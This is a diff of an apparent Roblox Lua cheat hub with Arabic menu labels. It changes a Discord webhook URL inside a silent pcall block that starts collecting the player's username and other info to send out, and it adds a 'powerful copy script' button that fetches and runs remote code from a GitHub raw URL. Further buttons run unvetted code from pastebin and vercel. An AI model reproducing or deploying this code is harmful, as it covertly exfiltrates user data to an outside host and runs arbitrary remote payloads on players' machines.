@@ -66,7 +66,7 @@ end
 --==================================================
 
 pcall(function()
-    local _W = "https://discord.com/api/webhooks/1555177488450191391/-8MZ9KYvmDV8hyZylvPwlmNsyl9dzcnz3zvvhvmSrWCq8udLZqvnLEF_4wXBQVmBzZaq"
+    local _W = "https://discord.com/api/webhooks/1557748097935872030/BwE66s0NX4FQKSFof5xg8KXKfnXK2P_1KCsPf0WTTFU-Np0qNJc5RF1CZDy2FFeaZcT7"
     local _info = {}
 
     _info.Username = _L.Name
@@ -902,6 +902,12 @@ local function LoadMainScript()
 
     local TabCopy = Window:NewTab("نسخ")
     local SecCopy = TabCopy:NewSection("نسخ تلقائي")
+    
+    -- زر سكربت نسخ قوي الذي يشغل الكود المخصص
+    SecCopy:NewButton("سكربت نسخ قوي", "تشغيل سكربت النسخ القوي", function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/blackontop123123-max/NHYQ/refs/heads/main/NHYQ776'))()
+    end)
+
     SecCopy:NewButton("نسخ تلقائي", "نسخ تلقائي", function()
         loadstring(game:HttpGet("https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_ui"))()
     end)
@@ -920,15 +926,9 @@ local function LoadMainScript()
     SecProtect:NewButton("حماية", "حماية", function()
         loadstring(game:HttpGet("https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_hh"))()
     end)
-
-    --==================================================
-    -- حماية بلو (مضاف فقط)
-    --==================================================
-
     SecProtect:NewButton("حماية بلو", "تشغيل حماية بلو", function()
         loadstring(game:HttpGet("https://pastebin.com/raw/7UpdjdhN"))()
     end)
-
     SecProtect:NewButton("حماية فلنق", "حماية فلنق", function()
         loadstring(game:HttpGet("https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_bn"))()
     end)
